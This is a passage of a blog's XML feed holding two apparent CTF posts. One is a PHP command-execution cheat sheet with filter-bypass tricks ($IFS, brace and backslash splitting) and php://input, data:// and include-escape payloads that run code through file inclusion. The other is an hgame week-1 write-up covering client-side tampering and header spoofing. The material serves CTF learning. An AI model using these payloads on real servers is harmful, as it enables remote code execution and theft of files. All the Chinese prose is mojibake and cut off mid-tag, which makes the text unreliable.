      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpå‘½ä»¤æ‰§è¡Œ</title>
      <link href="/2024/02/04/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2024/02/04/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="æˆ‘å‘ç°æˆ‘ç»å¸¸ä¼šå¿˜è®°phpå‘½ä»¤æ‰§è¡Œçš„ç»•è¿‡çš„æ–¹å¼æ‰€ä»¥æˆ‘æƒ³è¿™åœ¨è¿™é‡Œå†™è¿™ç¯‡å…³äºphpå‘½ä»¤æ‰§è¡Œçš„æ€»ç»“ä»¥åŠé¢˜ç›®çš„æ€»ç»“"><a href="#æˆ‘å‘ç°æˆ‘ç»å¸¸ä¼šå¿˜è®°phpå‘½ä»¤æ‰§è¡Œçš„ç»•è¿‡çš„æ–¹å¼æ‰€ä»¥æˆ‘æƒ³è¿™åœ¨è¿™é‡Œå†™è¿™ç¯‡å…³äºphpå‘½ä»¤æ‰§è¡Œçš„æ€»ç»“ä»¥åŠé¢˜ç›®çš„æ€»ç»“" class="headerlink" title="æˆ‘å‘ç°æˆ‘ç»å¸¸ä¼šå¿˜è®°phpå‘½ä»¤æ‰§è¡Œçš„ç»•è¿‡çš„æ–¹å¼æ‰€ä»¥æˆ‘æƒ³è¿™åœ¨è¿™é‡Œå†™è¿™ç¯‡å…³äºphpå‘½ä»¤æ‰§è¡Œçš„æ€»ç»“ä»¥åŠé¢˜ç›®çš„æ€»ç»“"></a>æˆ‘å‘ç°æˆ‘ç»å¸¸ä¼šå¿˜è®°phpå‘½ä»¤æ‰§è¡Œçš„ç»•è¿‡çš„æ–¹å¼æ‰€ä»¥æˆ‘æƒ³è¿™åœ¨è¿™é‡Œå†™è¿™ç¯‡å…³äºphpå‘½ä»¤æ‰§è¡Œçš„æ€»ç»“ä»¥åŠé¢˜ç›®çš„æ€»ç»“</h1><h1 id="å‘½ä»¤æ‰§è¡Œçš„å¸¸è§å‡½æ•°"><a href="#å‘½ä»¤æ‰§è¡Œçš„å¸¸è§å‡½æ•°" class="headerlink" title="å‘½ä»¤æ‰§è¡Œçš„å¸¸è§å‡½æ•°"></a>å‘½ä»¤æ‰§è¡Œçš„å¸¸è§å‡½æ•°</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.<span class="title function_ invoke__">system</span>()<span class="comment">//æœ‰å›æ˜¾</span></span><br><span class="line"><span class="number">2</span>.<span class="title function_ invoke__">exec</span>()<span class="comment">//æ— å›æ˜¾ï¼Œè¿”å›å€¼ä¸ºæ•°ç»„,éœ€è¦ä½¿ç”¨print_r()è¾“å‡º</span></span><br><span class="line"><span class="number">3</span>.<span class="title function_ invoke__">passthru</span>()<span class="comment">//æœ‰å›æ˜¾ï¼Œä¸systemå·®ä¸å¤š</span></span><br><span class="line"><span class="number">4</span>.<span class="title function_ invoke__">shell_exec</span>()<span class="comment">//æ— å›æ˜¾ï¼Œè¿”å›å€¼ä¸ºå­—ç¬¦ä¸²ï¼Œä½¿ç”¨echoæˆ–print()</span></span><br><span class="line"><span class="number">5</span>.<span class="title function_ invoke__">popen</span>()<span class="comment">//è¿”å›çš„æ˜¯ä¸€ä¸ªæ–‡ä»¶ç±»å‹å¯ä»¥ä½¿ç”¨echo fread(popen(&#x27;ls&#x27;,&#x27;r&#x27;),1000);æ‰§è¡Œã€‚</span></span><br><span class="line"><span class="number">6</span>.``æ— å›æ˜¾éœ€è¦ä½¿ç”¨<span class="keyword">echo</span>è¾“å‡º</span><br></pre></td></tr></table></figure><h1 id="å¸¸è§çš„è¯»å–å‘½ä»¤"><a href="#å¸¸è§çš„è¯»å–å‘½ä»¤" class="headerlink" title="å¸¸è§çš„è¯»å–å‘½ä»¤"></a>å¸¸è§çš„è¯»å–å‘½ä»¤</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ls <span class="comment">//ç›®å½•è¯»å–</span></span><br><span class="line">find<span class="comment">//ç›®å½•è¯»å–</span></span><br><span class="line">dir <span class="comment">//ç›®å½•è¯»å–</span></span><br><span class="line">cat <span class="comment">//æ–‡ä»¶è¯»å–ï¼ˆæ­£å‘è¯»å–ï¼‰</span></span><br><span class="line">tac <span class="comment">//æ–‡ä»¶è¯»å–ï¼ˆåå‘è¯»å–ï¼‰</span></span><br><span class="line">more<span class="comment">//æ–‡ä»¶è¯»å–ï¼ˆä¸œè¥¿å¤šçš„æ—¶å€™ä¸€é¡µä¸€é¡µè¯»å–ï¼‰</span></span><br><span class="line">less<span class="comment">//å’Œmoreç›¸ä¼¼</span></span><br><span class="line">tail<span class="comment">//è¯»å–æ–‡ä»¶çš„æœ€åå‡ è¡Œ</span></span><br><span class="line">nl  <span class="comment">//æ˜¾ç¤ºæ—¶é¡ºä¾¿è¾“å‡ºè¡Œå·</span></span><br><span class="line">od  <span class="comment">//ä»¥äºŒè¿›å½¢å¼è¯»å–æ–‡æ¡£ å¯ä»¥ç›´æ¥ä½¿ç”¨ä¹Ÿå¯ä»¥system(&#x27;od -A d -c fla\g.php&#x27;)ï¼›è¿™ä¹ˆä½¿ç”¨</span></span><br><span class="line">xdd <span class="comment">//ä¸odç›¸ä¼¼</span></span><br><span class="line">sort<span class="comment">//æ’åºï¼ŒåŒæ ·ä¹Ÿä¼šè¾“å‡ºã€‚</span></span><br><span class="line">file -f<span class="comment">//åˆ©ç”¨æŠ¥é”™è¿›è¡Œè¾“å‡º</span></span><br><span class="line">grep<span class="comment">//åœ¨æŸä¸ªæ–‡ä»¶å†…æŸ¥æ‰¾å­—ç¬¦ã€‚å¯ä»¥è¿™ä¹ˆç”¨system(&#x27;grep * fla\g.php&#x27;);æˆ–è€…system(&#x27;grep fl fla\g.php&#x27;);ç›´æ¥æŸ¥æ‰¾æœ‰flçš„é‚£ä¸€è¡Œ</span></span><br></pre></td></tr></table></figure><h1 id="å¸¸è§ç»•è¿‡"><a href="#å¸¸è§ç»•è¿‡" class="headerlink" title="å¸¸è§ç»•è¿‡"></a>å¸¸è§ç»•è¿‡</h1><h2 id="ç©ºæ ¼ç»•è¿‡"><a href="#ç©ºæ ¼ç»•è¿‡" class="headerlink" title="ç©ºæ ¼ç»•è¿‡"></a>ç©ºæ ¼ç»•è¿‡</h2><p>ç©ºæ ¼ä¸€èˆ¬å¯ä»¥é€šè¿‡å¦‚ä¸‹æ–¹å¼è¿›è¡Œæ›¿ä»£</p><h3 id="1-å¤§æ‹¬å·ç»•è¿‡"><a href="#1-å¤§æ‹¬å·ç»•è¿‡" class="headerlink" title="1.å¤§æ‹¬å·ç»•è¿‡"></a>1.å¤§æ‹¬å·ç»•è¿‡</h3><p>æ ¼å¼å¦‚ä¸‹<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;&#123;cat,flag&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure></p><h3 id="2-IFSç»•è¿‡"><a href="#2-IFSç»•è¿‡" class="headerlink" title="2.$IFSç»•è¿‡"></a>2.$IFSç»•è¿‡</h3><p>åœ¨linuxé‡Œå¯ä»¥ä½¿ç”¨<code>$IFS</code>,<code>$IFS$9</code>(æ•°å­—å¯ä»¥æ˜¯1åˆ°9),${IFS}</p><h3 id="3-é‡å®šå‘ç¬¦ç»•è¿‡"><a href="#3-é‡å®šå‘ç¬¦ç»•è¿‡" class="headerlink" title="3.é‡å®šå‘ç¬¦ç»•è¿‡"></a>3.é‡å®šå‘ç¬¦ç»•è¿‡</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;&gt;</span><br><span class="line">&lt;ï¼ˆåŸç†ä¸ºåŠ æ–‡ä»¶å†…å®¹é‡å®šå‘åˆ°caté‡Œï¼‰</span><br><span class="line">system(&#x27;cat&lt;flag&#x27;);</span><br></pre></td></tr></table></figure><h2 id="åæ–œæ ç»•è¿‡"><a href="#åæ–œæ ç»•è¿‡" class="headerlink" title="\åæ–œæ ç»•è¿‡"></a>\åæ–œæ ç»•è¿‡</h2><p>åœ¨æ­£åˆ™é…åˆæ˜¯å¦‚æœåŒ¹é…çš„ä¸ºflagé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°è¯•ä½¿ç”¨\æ¥è¿›è¡Œç»•è¿‡ã€‚å¦‚ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(&#x27;cat f\lag&#x27;);</span><br></pre></td></tr></table></figure></p><h2 id="åˆ†å·è¿‡æ»¤"><a href="#åˆ†å·è¿‡æ»¤" class="headerlink" title=";åˆ†å·è¿‡æ»¤"></a>;åˆ†å·è¿‡æ»¤</h2><p>å½“é¢˜ç›®å°†;è¿›è¡Œè¿‡æ»¤æ—¶æˆ‘ä»¬å¯ä»¥ä½¿ç”¨?&gt;æ¥ä»£æ›¿åˆ†å·ï¼Œè¿™æ˜¯å› ä¸ºevalå°†å…¶å‚æ•°å½“æˆphpä»£ç æ‰§è¡Œï¼Œä½¿ç”¨?&gt;æ˜¯ç›´æ¥ç»“æŸäº†ç¨‹åºï¼Œå³è¯¥å¥ä»£ç ä¸ºæœ€åä¸€å¥å³ä¸éœ€è¦;ã€‚</p><h1 id="æ–‡ä»¶åŒ…å«è¯»å–"><a href="#æ–‡ä»¶åŒ…å«è¯»å–" class="headerlink" title="æ–‡ä»¶åŒ…å«è¯»å–"></a>æ–‡ä»¶åŒ…å«è¯»å–</h1><p>æ–‡ä»¶åŒ…å«è¯»å–å…¶ä¸€èˆ¬è¦åˆ©ç”¨åˆ°phpä¼ªåè®®ï¼Œå…·ä½“çœ‹è¿™ä¸ªåšå®¢<a href="https://blog.csdn.net/Jeff_12138/article/details/124815370">phpä¼ªåè®®</a><br>å¸¸ç”¨å¦‚ä¸‹å‡ ä¸ªä¼ªåè®®ï¼Œå…¶ä»–è¯¦ç»†å¯ä»¥çœ‹ä¸Šé¢çš„ã€‚</p><h2 id="php"><a href="#php" class="headerlink" title="php://"></a>php://</h2><h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><p>è¿™ä¸ªåè®®æ˜¯ç”¨æ¥æŸ¥çœ‹æ–‡ä»¶å†…å®¹çš„ï¼Œç”±äºæˆ‘ä»¬åœ¨æ–‡ä»¶åŒ…å«phpæ–‡ä»¶æ—¶ï¼Œç”±äºå­˜åœ¨æ ‡ç­¾&lt;?php ?&gt;æ‰€ä»¥å¹¶ä¸ä¼šå°†æ–‡ä»¶å†…å®¹è¾“å‡ºï¼Œè€Œæ˜¯æ‰§è¡Œä»£ç ï¼Œè¿™æ ·æˆ‘ä»¬å°±æ— æ³•æŸ¥çœ‹æ–‡ä»¶å†…å®¹ï¼Œæ‰€ä»¥å½“æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>php://filter/read=convert.base64-encode/resource=</code>æ¥å¯¹è¯»å–çš„æ–‡ä»¶è¿›è¡Œbase64ç¼–ç ä½¿å…¶ä¸ä¼šè¢«è¯†åˆ«ä¸ºphpä»£ç ã€‚</p><h3 id="php-input-POST-DATA-æ‰§è¡Œphpä»£ç "><a href="#php-input-POST-DATA-æ‰§è¡Œphpä»£ç " class="headerlink" title="php://input + [POST DATA]æ‰§è¡Œphpä»£ç "></a>php://input + [POST DATA]æ‰§è¡Œphpä»£ç </h3><p>è¿™ä¸ªä¼ªåè®®ä¼šå°†postä¼ å…¥çš„å†…å®¹å½“æˆphpä»£ç æ‰§è¡Œ<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=php://input</span><br><span class="line">[POST DATAéƒ¨åˆ†]</span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure><br>postä¼ å…¥å†…å®¹ä»éœ€è¦å®‰è£…phpçš„æ ¼å¼</p><h2 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h2><h3 id="ç”¨æ³•"><a href="#ç”¨æ³•" class="headerlink" title="ç”¨æ³•"></a>ç”¨æ³•</h3><p>data://text/plain,<br>data://text/plain;base64ï¼Œ</p><h3 id="data-text-plain"><a href="#data-text-plain" class="headerlink" title="data://text/plain,"></a>data://text/plain,</h3><p>åœ¨åé¢åŠ ä¸Šè¦æ‰§è¡Œçš„phpå‘½ä»¤ï¼Œåç«¯ä¼šæ‰§è¡Œè¯¥phpæŒ‡ä»¤<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</span></span><br></pre></td></tr></table></figure></p><h3 id="data-text-plain-base64"><a href="#data-text-plain-base64" class="headerlink" title="data://text/plain;base64,"></a>data://text/plain;base64,</h3><p>åŒä¸Šåªä¸è¿‡åé¢çš„å‘½ä»¤æ˜¯ç»è¿‡base64ç¼–ç çš„ä»£ç ã€‚<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">system(&quot;ls&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>æœ€å¥½ä½¿ç”¨ä¸Šé¢çš„æ ¼å¼è¿›è¡Œä¹¦å†™åå†base64ç¼–ç ã€‚</p><h2 id="è¡¥å……ä¸Šé¢çš„ä¸ºåè®®ä¸­çš„phpä»£ç å¯ä»¥ä½¿ç”¨-lt-gt-çŸ­æ ‡ç­¾æ¥ä»£æ›¿-lt-php-gt"><a href="#è¡¥å……ä¸Šé¢çš„ä¸ºåè®®ä¸­çš„phpä»£ç å¯ä»¥ä½¿ç”¨-lt-gt-çŸ­æ ‡ç­¾æ¥ä»£æ›¿-lt-php-gt" class="headerlink" title="è¡¥å……ä¸Šé¢çš„ä¸ºåè®®ä¸­çš„phpä»£ç å¯ä»¥ä½¿ç”¨&lt;?=   ?&gt;çŸ­æ ‡ç­¾æ¥ä»£æ›¿&lt;?php ?&gt;"></a>è¡¥å……ä¸Šé¢çš„ä¸ºåè®®ä¸­çš„phpä»£ç å¯ä»¥ä½¿ç”¨&lt;?=   ?&gt;çŸ­æ ‡ç­¾æ¥ä»£æ›¿&lt;?php ?&gt;</h2><h1 id="åœ¨phpå‘½ä»¤æ‰§è¡Œçš„æ–‡ä»¶åŒ…å«è¯»å–ï¼Œä¸€èˆ¬ä¹Ÿç®—å‚æ•°é€ƒé€¸ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹"><a href="#åœ¨phpå‘½ä»¤æ‰§è¡Œçš„æ–‡ä»¶åŒ…å«è¯»å–ï¼Œä¸€èˆ¬ä¹Ÿç®—å‚æ•°é€ƒé€¸ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹" class="headerlink" title="åœ¨phpå‘½ä»¤æ‰§è¡Œçš„æ–‡ä»¶åŒ…å«è¯»å–ï¼Œä¸€èˆ¬ä¹Ÿç®—å‚æ•°é€ƒé€¸ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹"></a>åœ¨phpå‘½ä»¤æ‰§è¡Œçš„æ–‡ä»¶åŒ…å«è¯»å–ï¼Œä¸€èˆ¬ä¹Ÿç®—å‚æ•°é€ƒé€¸ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å½“é˜²ç«å¢™è¿‡æ»¤äº†å•åŒå¼•å·å’Œæ‹¬å·æ—¶æˆ‘ä»¬æ— æ³•ä½¿ç”¨<code>eval($_GET[1]);</code>è¿›è¡Œé€ƒé€¸è€…æ—¶å€™æˆ‘ä»¬éœ€è¦ä½¿ç”¨æ— æ‹¬å·çš„å‡½æ•°è¿›è¡Œé€ƒé€¸å³includeã€‚æˆ‘ä»¬å¯ä»¥è¿™ä¹ˆå†™<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include%0A$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨phpä¼ªåè®®é…åˆ<code>include $_GET[1]</code>è¿›è¡Œé€ƒé€¸ã€‚</p><h1 id="åˆ©ç”¨-GETæˆ–-POSTå‚æ•°é€ƒé€¸ç»•è¿‡"><a href="#åˆ©ç”¨-GETæˆ–-POSTå‚æ•°é€ƒé€¸ç»•è¿‡" class="headerlink" title="åˆ©ç”¨$_GETæˆ–$_POSTå‚æ•°é€ƒé€¸ç»•è¿‡"></a>åˆ©ç”¨<code>$_GET</code>æˆ–<code>$_POST</code>å‚æ•°é€ƒé€¸ç»•è¿‡</h1><p>æœ‰çš„é¢˜ç›®å¯ä»¥åˆ©ç”¨å°†å‚æ•°èµ‹å€¼ä¸ºc=eval<code>($_GET[1]);</code>åå‘å‚æ•°1ä¼ é€’ä¸€ä¸ªå‘½ä»¤å¦‚1=phpinfo();è¿›è¡Œç»•è¿‡ç”±äºè¿‡æ»¤çš„å‚æ•°ä¸ºcé˜²ç«å¢™ä¸ä¼šè¿‡æ»¤1æ‰€ä»¥å¯ä»¥ç»•è¿‡</p><h1 id="æ— å‚æ•°rceè¯·æ±‚å¤´ç»•è¿‡"><a href="#æ— å‚æ•°rceè¯·æ±‚å¤´ç»•è¿‡" class="headerlink" title="æ— å‚æ•°rceè¯·æ±‚å¤´ç»•è¿‡"></a>æ— å‚æ•°rceè¯·æ±‚å¤´ç»•è¿‡</h1><p>#</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
          <category> å‘½ä»¤æ‰§è¡Œ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å‘½ä»¤æ‰§è¡Œ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hgame-week1</title>
      <link href="/2024/01/30/hgame-week1/"/>
      <url>/2024/01/30/hgame-week1/</url>
      
        <content type="html"><![CDATA[<h1 id="ç¬¬ä¸€å‘¨æˆ‘å°±æœ‰ç‚¹å¼€æ‘†äº†ï¼Œåªå§webï¼Œé€†å‘ï¼Œå’Œæ‚é¡¹ç»™akäº†ï¼ˆå…¶ä»–éƒ½æ‡’å¾—å†™äº†ï¼‰ï¼Œå¯†ç åªå†™äº†ä¸ªrsaç®—æ³•çš„é¢˜ç›®ï¼Œå¯¹rsaç®—æ³•æœ‰äº†ä¸€äº›äº†è§£ã€‚ä¸‹å‘¨è¦æ‰“èµ·ç²¾ç¥äº†ï¼Œä¸èƒ½æ‘†ä¸‹å»äº†ã€‚"><a href="#ç¬¬ä¸€å‘¨æˆ‘å°±æœ‰ç‚¹å¼€æ‘†äº†ï¼Œåªå§webï¼Œé€†å‘ï¼Œå’Œæ‚é¡¹ç»™akäº†ï¼ˆå…¶ä»–éƒ½æ‡’å¾—å†™äº†ï¼‰ï¼Œå¯†ç åªå†™äº†ä¸ªrsaç®—æ³•çš„é¢˜ç›®ï¼Œå¯¹rsaç®—æ³•æœ‰äº†ä¸€äº›äº†è§£ã€‚ä¸‹å‘¨è¦æ‰“èµ·ç²¾ç¥äº†ï¼Œä¸èƒ½æ‘†ä¸‹å»äº†ã€‚" class="headerlink" title="ç¬¬ä¸€å‘¨æˆ‘å°±æœ‰ç‚¹å¼€æ‘†äº†ï¼Œåªå§webï¼Œé€†å‘ï¼Œå’Œæ‚é¡¹ç»™akäº†ï¼ˆå…¶ä»–éƒ½æ‡’å¾—å†™äº†ï¼‰ï¼Œå¯†ç åªå†™äº†ä¸ªrsaç®—æ³•çš„é¢˜ç›®ï¼Œå¯¹rsaç®—æ³•æœ‰äº†ä¸€äº›äº†è§£ã€‚ä¸‹å‘¨è¦æ‰“èµ·ç²¾ç¥äº†ï¼Œä¸èƒ½æ‘†ä¸‹å»äº†ã€‚"></a>ç¬¬ä¸€å‘¨æˆ‘å°±æœ‰ç‚¹å¼€æ‘†äº†ï¼Œåªå§webï¼Œé€†å‘ï¼Œå’Œæ‚é¡¹ç»™akäº†ï¼ˆå…¶ä»–éƒ½æ‡’å¾—å†™äº†ï¼‰ï¼Œå¯†ç åªå†™äº†ä¸ªrsaç®—æ³•çš„é¢˜ç›®ï¼Œå¯¹rsaç®—æ³•æœ‰äº†ä¸€äº›äº†è§£ã€‚ä¸‹å‘¨è¦æ‰“èµ·ç²¾ç¥äº†ï¼Œä¸èƒ½æ‘†ä¸‹å»äº†ã€‚</h1><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="1-2048-16"><a href="#1-2048-16" class="headerlink" title="1.2048*16"></a>1.2048*16</h2><p>è¿™é“é¢˜ç›®æˆ‘ä»¬æ‰“å¼€ä¸€ä¸ªå‘ç°æ˜¯ä¸€ä¸ª2048çš„æ¸¸æˆï¼Œé¢˜ç›®è¦æ±‚æˆ‘ä»¬ç»„åˆå‡º32768è¿™ä¸€ä¸ªæ–¹å—ã€‚æˆ‘ä»¬æŸ¥çœ‹æºç ä¼šå‘ç°ï¼Œè¯¥é¢˜ç›®å¯¹æºç è¿›è¡Œäº†æ··æ·†ï¼Œéå¸¸éš¾çœ‹ã€‚<br><img src="/2024/01/30/hgame-week1/1.png" class="" title="alt text"><br>æˆ‘ä»¬å…ˆè¿›è¡Œå¸¸è§„æœç´¢ã€‚å¦‚æœç´¢alertï¼Œflagï¼Œ32768éƒ½æ²¡æœ‰ç”¨<br>ä½†æ˜¯è¿™é“é¢˜ç›®åœ¨ä¸‹æ–¹ç»™å‡ºäº†ï¼Œ2048è¿™ä¸ªæ¸¸æˆçš„åŸåœ°å€ï¼Œé‚£ä¹ˆè¿™ä¸ªæ¸¸æˆè‚¯å®šæ˜¯å°†2048è¿›è¡Œäº†ä¸€äº›é­”æ”¹ã€‚æˆ‘ä»¬ç‚¹å¼€2048ä¸€äº›çš„åŸå€ï¼Œf12æŸ¥çœ‹æºç <br>æœç´¢2048æˆ‘ä»¬ä¼šå‘ç°ä¸€ä¸ªå˜é‡e.valueï¼Œæˆ‘ä»¬è™½ç„¶ä¸çŸ¥é“è¿™ä¸ªeå˜é‡æ˜¯ä»€ä¹ˆä½†æ˜¯æˆ‘ä»¬å¯ä»¥è¿›è¡Œè°ƒè¯•ï¼Œæˆ‘ä»¬å…ˆåœ¨è¿™ä¸€å«åŠ ä¸€ä¸ªæ–­ç‚¹ï¼Œè¿è¡Œ<br><img src="/2024/01/30/hgame-week1/2.png" class="" title="alt text"><br>æˆ‘ä»¬å¯ä»¥å‘ç°è¿™ä¸ªeé‡Œå«æœ‰valueï¼Œxå’Œyï¼Œè€Œä¸”valueå€¼ä¸º2é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥çŒœæµ‹ä¸€ä¸‹ï¼Œè¿™ä¸ªå°±æ˜¯æ–¹å—è¿™ä¸ªå…ƒç´ ï¼Œxyä»£è¡¨ä½ç½®å’Œvalueä»£è¡¨å€¼ï¼Œæˆ‘ä»¬å°è¯•åœ¨æ§åˆ¶å°ä¿®æ”¹e.valueçš„å€¼ï¼Œ<br><img src="/2024/01/30/hgame-week1/3.png" class="" title="aaa"><br>å–æ¶ˆæ–­ç‚¹ï¼Œè¿è¡Œç¨‹åºå‘ç°<br><img src="/2024/01/30/hgame-week1/4.png" class="" title="alt text"><br>å¤šäº†ä¸ª2048çš„æ–¹å—ã€‚é‚£ä¹ˆæˆ‘ä»¬åªè¦åœ¨æˆ‘ä»¬çš„é¢˜ç›®é‡Œæ‰¾åˆ°e.valueç„¶åè¿›è¡Œä¿®æ”¹å³å¯ã€‚<br>æˆ‘ä»¬ç‚¹å¼€é¢˜ç›®çš„æ§åˆ¶å°ä¼šå‘ç°å…¶æ— çº¿debugå¯¼è‡´æˆ‘ä»¬æ— æ³•è°ƒè¯•<br><img src="/2024/01/30/hgame-week1/5.png" class="" title="alt text"><br>åœ¨æŸ¥äº†åå‘ç°æˆ‘ä»¬å¯ä»¥è¾“å…¥å¦‚ä¸‹ä»£ç è§£å†³ï¼Œè¿™ä¸ªè´¼æ¶å¿ƒï¼Œå¡äº†æˆ‘åŠå¤©ã€‚<br><img src="/2024/01/30/hgame-week1/6.png" class="" title="alt text"><br>è§£å†³äº†æ”¾åè°ƒè¯•åï¼Œæˆ‘ä»¬æœç´¢2048,ä¼šå‘ç°<br><img src="/2024/01/30/hgame-week1/7.png" class="" title="alt text"><br>è™½ç„¶é•¿çš„å¾ˆæŠ½è±¡ä½†æ˜¯å¯¹æ¯”2048çš„æºç æˆ‘ä»¬å¯ä»¥çœ‹å‡ºæ¥<code>x[n(476)]</code>å°±æ˜¯e.valueæ¥ä¸‹æ¥å°±æ˜¯é‡å¤ä¸Šè¿°æ­¥éª¤äº†ã€‚<br>æ³¨æ„è¯¥æ¸¸æˆä¸èƒ½ç›´æ¥è¯¥å‡º32768çš„æ–¹å—éœ€è¦æ”¹å‡ºä¸¤ä¸ª16384çš„è¿›è¡Œç»„åˆã€‚</p><h2 id="2-bybassit"><a href="#2-bybassit" class="headerlink" title="2.bybassit"></a>2.bybassit</h2><p>è¿™é“é¢˜ç›®æˆ‘ä»¬ç‚¹å¼€å‘ç°æœ‰ä¸€ä¸ªæ³¨å†Œï¼Œæˆ‘ä»¬ç‚¹å¼€è¿™ä¸ªæ³¨å†Œé¡µé¢ï¼Œä¼šå‘ç°æ— æ³•æ³¨å†Œï¼Œä½†æ˜¯æˆ‘ä»¬å‘ç°å…¶å¼¹å‡ºçš„é¡µé¢æ˜¯jsçš„alertå¼¹çª—ï¼Œæˆ‘ä»¬æ‰“å¼€æºç ï¼Œæœç„¶æ˜¯jsæçš„é¬¼<br><img src="/2024/01/30/hgame-week1/8.png" class="" title="alt text"><br>è¿™ä¸ªä»£ç å½“æˆ‘ä»¬ç‚¹å‡»æ³¨å†Œæ—¶ä¼šè§¦å‘ï¼Œä¼šå°†æˆ‘ä»¬é‡å®šå‘ä¼šç™»é™†ç•Œé¢ï¼Œåªè¦ç¦ç”¨jså°±å¯ä»¥äº†ï¼Œæ³¨å†Œåç™»é™†ï¼ˆè®°å¾—æŠŠjsé‡æ–°æ‰“å¼€ï¼‰ï¼Œä¹‹åå°±å¯ä»¥å¾—åˆ°flagäº†</p><h2 id="3-ezHTTP"><a href="#3-ezHTTP" class="headerlink" title="3.ezHTTP"></a>3.ezHTTP</h2><img src="/2024/01/30/hgame-week1/9.png" class=""><p>ç”¨referer<br><img src="/2024/01/30/hgame-week1/10.png" class="" title="alt text"><br>æ”¹uaå¤´<br><img src="/2024/01/30/hgame-week1/11.png" class="" title="alt text"><br>è¿™ä¸ªæ”¹ipçš„æ ‡å¤´æœ‰å¾ˆå¤šï¼Œåœ¨ç½‘ä¸Šæœä¸€ä¸‹ä¹‹åä¸€ä¸ªä¸€ä¸ªè¯•ï¼Œ</p><h2 id="4-Select-Courses"><a href="#4-Select-Courses" class="headerlink" title="4.Select Courses"></a>4.Select Courses</h2><p>è¿™é“é¢˜ç›®æ˜¯æˆ‘åœ¨æ²¡ä»€ä¹ˆæ€è·¯æ˜¯éšä¾¿ç‚¹å‘ç°ç«Ÿç„¶é€‰ä¸Šäº†ï¼Œæ€è€ƒäº†ä¸€ä¸‹çŒœæµ‹æ˜¯ç‚¹å‡»æ¬¡æ•°è¿‡å¤šå¯¼è‡´æœåŠ¡å™¨å¤„ç†ä¸è¿‡æ¥ï¼Œæ‰€æœ‰æˆ‘ä»¬ç›´æ¥æŠ“åŒ…å‘åŒ…çˆ†ç ´å³å¯</p><h2 id="5-jhat"><a href="#5-jhat" class="headerlink" title="5.jhat"></a>5.jhat</h2><p>è¿™é“é¢˜ç›®ï¼Œæç¤ºéœ€è¦è¿›è¡Œrceï¼Œæˆ‘ä»¬å…ˆç‚¹å¼€ï¼Œå‘ç°æœ‰ä¸€ä¸ªoqlçš„æœç´¢æ¡†æˆ‘ä»¬å…ˆéšä¾¿æœç´¢ä¸€ä¸‹<br>å‘ç°æŠ¥é”™äº†<br><img 